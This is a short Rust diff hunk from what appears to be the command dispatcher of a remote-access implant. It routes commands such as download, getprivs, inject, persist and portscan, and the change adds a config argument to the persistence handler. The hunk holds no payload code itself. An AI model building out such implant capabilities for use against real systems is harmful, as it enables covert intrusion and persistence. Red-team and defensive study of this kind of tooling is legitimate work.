@@ -99,7 +99,7 @@ impl NotionCommand {
             CommandType::Download(s) => download::handle(&s).await,
             CommandType::Getprivs    => getprivs::handle().await,
             CommandType::Inject(s)   => inject::handle(&s).await,
-            CommandType::Persist(s)  => persist::handle(&s).await,
+            CommandType::Persist(s)  => persist::handle(&s, config_options).await,
             CommandType::Portscan(s) => portscan::handle(&s).await,
             CommandType::Ps          => ps::handle().await,
             CommandType::Pwd         => pwd::handle().await,
